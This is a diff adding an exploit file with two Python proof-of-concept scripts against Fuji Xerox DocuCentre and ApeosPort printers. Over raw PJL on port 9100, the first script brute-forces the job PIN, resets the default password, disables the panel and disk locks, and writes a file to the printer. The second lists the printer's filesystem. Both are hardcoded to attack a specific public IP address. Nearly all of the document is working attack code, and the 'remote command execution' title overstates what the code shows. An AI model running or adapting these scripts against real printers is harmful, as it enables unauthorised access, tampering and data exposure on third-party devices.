@@ -1,0 +1,94 @@
+# Exploit Title: FUJI XEROX DocuCentre-V 3065 Printer - Remote Command Execution
+# Date: 2018-09-05
+# Exploit Author: vr_system
+# Vendor Homepage: https://www.fujixerox.com.cn/
+# Software Link: https://www.fujixerox.com.cn/
+# Version: DocuCentre-IV,DocuCentre-VI,DocuCentre-V,ApeosPort-VI,ApeosPort-V
+# Tested on: DocuCentre-V 3065,ApeosPort-VI C3371,ApeosPort-V C4475,ApeosPort-V C3375,DocuCentre-VI C2271,ApeosPort-V C5576,DocuCentre-IV C2263,DocuCentre-V C2263,ApeosPort-V 5070
+# CVE : N/A
+ 
+#  POC：Ability to write files to the printer
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+import socket
+import time
+PJL_START = "\033%-12345X@PJL "
+PJL_FINISH = "\033%-12345X\r\n"
+
+def Buildsocket(ip,port=9100):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)  
+    sock.settimeout(5)
+    try:
+        sock.connect((ip, port))
+    except:
+        print "[!*]-ip-%s-can't connect--" % ip
+        return 'error'
+    for i in range(500):
+        print"bypass pin:{0}".format(i)
+        PJL_INFO_ID = """JOB PASSWORD={0}\r\n""".format(i)
+        DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+        sock.send(DEVICEID)  
+        PJL_INFO_ID = """DEFAULT PASSWORD=0\r\n"""
+        DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+        sock.send(DEVICEID)  
+
+    PJL_INFO_ID = """DEFAULT CPLOCK=OFF\r\n"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+    sock.send(DEVICEID)  
+    PJL_INFO_ID = """DEFAULT DISKLOCK=OFF\r\n"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+    sock.send(DEVICEID)  
+
+    PJL_INFO_ID = """FSDOWNLOAD FORMAT:BINARY SIZE=4 NAME="0:/test4"\r\n"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+    sock.send(DEVICEID)  
+    try:
+        device = sock.recv(1024)
+    except:pass
+    PJL_INFO_ID = """FSUPLOAD NAME="0:/test4" OFFSET=0 SIZE=4\r\n"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+    sock.send(DEVICEID)  
+    try:
+        device = sock.recv(1024)
+    except:pass
+    finally:
+        sock.close()
+    print "OK"
+
+if __name__ == '__main__':
+    ip = "118.42.125.192"
+    Buildsocket(ip, port=9100)
+
+# POC：Ability to view files in the printer
+##!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+import socket
+PJL_START = "\033%-12345X@PJL "
+PJL_FINISH = "\033%-12345X\r\n"
+
+def Buildsocket(ip, port=9100):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) 
+    sock.settimeout(5)
+    try:
+        sock.connect((ip, port))
+    except:
+        print "[!*]-ip-%s-can't connect--" % ip
+        return 'error'
+    PJL_INFO_ID = """FSDIRLIST NAME="0:/" ENTRY=1 COUNT=65535"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  
+    sock.send(DEVICEID)  
+    try:
+        device = sock.recv(1024)
+    except:pass
+    PJL_INFO_ID = """FSDIRLIST NAME="0:/" ENTRY=1"""
+    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH
+    sock.send(DEVICEID)  #
+    try:
+        device = sock.recv(1024)
+    except:
+        return 'No'
+    print "[!*]-ip-%s-is-ok\r\ndeviceidis-%s" % (str(ip), device)
+    sock.close()
+    return 'OK'
+if __name__ == '__main__':
+    Buildsocket("118.42.125.192", port=9100)
